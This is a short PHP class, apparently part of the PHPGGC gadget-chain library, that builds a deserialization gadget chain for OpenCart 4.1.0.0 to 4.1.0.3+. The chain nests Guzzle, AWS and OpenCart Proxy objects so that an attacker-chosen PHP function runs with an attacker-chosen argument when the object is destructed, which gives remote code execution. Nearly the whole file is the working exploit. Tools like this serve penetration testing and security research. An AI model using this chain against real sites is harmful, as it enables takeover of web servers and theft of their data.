<?php

namespace GadgetChain\OpenCart;

class RCE2 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '4.1.0.0 <= 4.1.0.3+';
    public static $vector = '__destruct';
    public static $author = 'mcdruid';
    public static $information = 'This Gadget Chain typically ends up causing
    errors but not before the payload has been executed.';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \GuzzleHttp\Handler\CurlFactory(
            new \Aws\ResultPaginator(
                new \Opencart\System\Engine\Proxy('getCommand', $function),
                    $parameter
          ),
        );
    }
}